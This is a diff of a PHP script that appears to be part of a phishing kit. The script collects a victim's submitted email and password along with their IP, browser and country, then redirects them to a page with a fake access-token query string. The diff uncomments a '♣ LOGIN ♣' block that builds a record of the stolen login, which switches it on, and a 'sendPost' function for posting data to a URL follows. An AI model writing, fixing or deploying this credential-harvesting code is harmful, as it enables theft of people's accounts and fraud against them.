@@ -5,7 +5,7 @@ session_start();
 ob_start();
 set_time_limit(0);
 include("../../../../Email.php");
-include('../get_ip.php');
+include("get_ip.php");
 require "../os.php";
 require "../geoplugin.php";
 $DATE = date("d-m-Y h:i:sa");
@@ -14,10 +14,10 @@ $IP = $_SERVER["REMOTE_ADDR"];
 @$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
 $UserAgent =$_SERVER['HTTP_USER_AGENT'];
 $browser = explode(')',$UserAgent);				
-$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	
+$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 
+$_SESSION['COUNTRY'] = $_SESSION['_LOOKUP_COUNTRY_'];
 $mail    = $_SESSION['_email_']        = $_POST['login_email'];
 $PASS      = $_SESSION['_password_']     = $_POST['login_password'];
-$_SESSION['_LOOKUP_COUNTRY_'];
 function validate_email($mail){
   $regexp = "/^(?!(?:(?:\\x22?\\x5C[\\x00-\\x7E]\\x22?)|(?:\\x22?[^\\x5C\\x22]\\x22?)){255,})(?!(?:(?:\\x22?\\x5C[\\x00-\\x7E]\\x22?)|(?:\\x22?[^\\x5C\\x22]\\x22?)){65,}@)(?:(?:[\\x21\\x23-\\x27\\x2A\\x2B\\x2D\\x2F-\\x39\\x3D\\x3F\\x5E-\\x7E]+)|(?:\\x22(?:[\\x01-\\x08\\x0B\\x0C\\x0E-\\x1F\\x21\\x23-\\x5B\\x5D-\\x7F]|(?:\\x5C[\\x00-\\x7F]))*\\x22))(?:\\.(?:(?:[\\x21\\x23-\\x27\\x2A\\x2B\\x2D\\x2F-\\x39\\x3D\\x3F\\x5E-\\x7E]+)|(?:\\x22(?:[\\x01-\\x08\\x0B\\x0C\\x0E-\\x1F\\x21\\x23-\\x5B\\x5D-\\x7F]|(?:\\x5C[\\x00-\\x7F]))*\\x22)))*@(?:(?:(?!.*[^.]{64,})(?:(?:(?:xn--)?[a-z0-9]+(?:-+[a-z0-9]+)*\\.){1,126}){1,}(?:(?:[a-z][a-z0-9]*)|(?:(?:xn--)[a-z0-9]+))(?:-+[a-z0-9]+)*)|(?:\\[(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){7})|(?:(?!(?:.*[a-f0-9][:\\]]){7,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?)))|(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){5}:)|(?:(?!(?:.*[a-f0-9]:){5,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3}:)?)))?(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))(?:\\.(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))){3}))\\]))$/iD";
 if (!preg_match ($regexp, $mail)) return false;
@@ -79,7 +79,6 @@ function Error()
 
 header("Location: ../home.php?customerProfileweb-id=".sha1(md5(gmdate('Dr Hard')))."_&TokenAccess=".strtoupper(sha1(256))." ");
 
-/*
 $localrez ="###################################################
 ###################################################     
 =-=-=-=-=-=-=-=-=-=- ♣ LOGIN ♣ =-=-=-=-=-=-=-=-=-
@@ -103,7 +102,8 @@ Date: ".$DATE."
 else {
 	echo ERROR();
 	}		
-*/
+
+
 
 //----------------send request post to url ----------------
 function sendPost($url,$data) {
